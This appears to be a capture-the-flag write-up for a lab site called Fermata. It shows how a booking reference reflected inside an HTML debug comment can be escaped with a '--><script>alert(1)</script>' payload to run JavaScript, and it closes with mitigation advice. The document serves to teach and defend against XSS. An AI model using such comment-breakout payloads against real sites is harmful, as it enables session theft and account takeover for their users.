---
title: "Cross-Site Scripting (XSS) – HTML Comment Breakout | Fermata"
date: 2026-05-29 00:00:00 +0530
categories: [A05 - Injection, Cross-Site Scripting (XSS)]
tags: [webversepro, xss, reflected-xss, html-comment, injection, client-side]
author: Shivansh Sharma
image:
path: /assets/images/posts/fermata-reflected-xss.webp
alt: Cross-Site Scripting (XSS) – HTML Comment Breakout | Fermata
-----------------------------------------------------------------

## Lab Link

Lab: [Fermata](https://dashboard.webverselabs-pro.com/challenges/fermata)

---

## Overview

Fermata is a piano-tuner booking site that allows users to submit booking details and later revisit a booking reference page.

The application includes an old debug feature that reflects the booking reference inside an HTML comment. While comments are not visible in the rendered page, they are still part of the HTML document and can become dangerous if user-controlled input is inserted without proper encoding.

By closing the comment context and injecting a script tag, an attacker can break out of the HTML comment and execute JavaScript in the browser.

This challenge demonstrates a reflected Cross-Site Scripting vulnerability caused by unsafe output handling inside an HTML comment context.

---

## Objective

Identify the HTML comment reflection point, break out of the comment context, execute JavaScript, and retrieve the flag.

---

## Vulnerability Identification

This challenge is primarily a Reflected Cross-Site Scripting vulnerability.

### Classification Hierarchy

A05 - Injection
└── Client-Side Injection
└── Cross-Site Scripting (XSS)
└── Reflected XSS via HTML Comment Breakout

---

## Reconnaissance

Navigate to the booking page:

```text
https://e62ed005-4065-fermata-3c1ab.challenges.webverselabs-pro.com/book
```

Submit a booking request using a simple test payload in the piano make/model field:

```html
<script>alert(1)</script>
```

After submission, the application generates a booking reference.

Example:

```text
FM-2026-181CC9
```

The resulting booking URL looks like:

```text
https://e62ed005-4065-fermata-3c1ab.challenges.webverselabs-pro.com/book?ref=FM-2026-181CC9
```

At first, the payload does not execute visibly, so the next step is to inspect where the input appears in the page source.

---

## Exploitation

### Step 1 - View the Source Code

Open the generated booking page and view the source.

Inside the HTML source, the booking reference appears in a debug comment:

```html
<!-- debug:booking-ref FM-2026-181CC9 -->
```

This reveals the vulnerable output context.

The input is reflected inside an HTML comment rather than the visible document body.

---

### Step 2 - Understand the Context

A normal script payload does not execute because it remains inside a comment.

Example:

```html
<!-- debug:booking-ref <script>alert(1)</script> -->
```

The browser treats this as comment text, not executable HTML.

To execute JavaScript, the payload must first close the comment.

---

### Step 3 - Break Out of the HTML Comment

Use the payload:

```html
--><script>alert(1)</script>
```

This transforms the rendered HTML into:

```html
<!-- debug:booking-ref --><script>alert(1)</script> -->
```

The first part closes the comment:

```html
-->
```

Then the browser parses the script tag as real HTML:

```html
<script>alert(1)</script>
```

This causes JavaScript execution.

---

### Step 4 - Trigger the XSS Detection

After submitting the breakout payload, the reflected XSS payload fires successfully.

The lab detects script execution and reveals the flag.

```text
WEBVERSE{.....}
```

---

## Proof of Exploitation

### Reflection Context

```html
<!-- debug:booking-ref FM-2026-181CC9 -->
```

### Failed Basic Payload

```html
<script>alert(1)</script>
```

### Working Payload

```html
--><script>alert(1)</script>
```

### Resulting HTML

```html
<!-- debug:booking-ref --><script>alert(1)</script> -->
```

### Flag

```text
WEBVERSE{.....}
```

---

## Impact

An attacker can execute arbitrary JavaScript in the victim's browser.

Potential impact includes:

* Session theft
* Account takeover
* Credential harvesting
* Page defacement
* Malicious redirects
* CSRF bypass
* Sensitive data exfiltration

Even though the vulnerable reflection occurs inside an HTML comment, it is still dangerous because attackers can escape the comment context if output is not encoded correctly.

---

## Mitigation

### Context-Aware Output Encoding

Encode user-controlled data according to the output context.

Inside HTML comments, avoid reflecting user input entirely when possible.

### Remove Debug Comments

Debug comments should never be deployed to production.

### Sanitize Dangerous Sequences

Reject or encode sequences such as:

```text
-->
<script>
</script>
```

### Avoid User Input in Comments

HTML comments are not a safe place for untrusted data.

### Use Safe Templating Defaults

Use frameworks that automatically escape output.

### Implement Content Security Policy

A strong CSP can reduce the impact of XSS even if output encoding fails.

---

## Real-World Insight

HTML comments are often treated as harmless because users do not see them in the rendered page.

However, comments are still part of the HTML document. If untrusted input is inserted into a comment without proper encoding, attackers can terminate the comment and inject active content.

The Fermata challenge demonstrates an important XSS lesson:

**Security depends on the output context. A payload that fails in one context may succeed after escaping into another.**
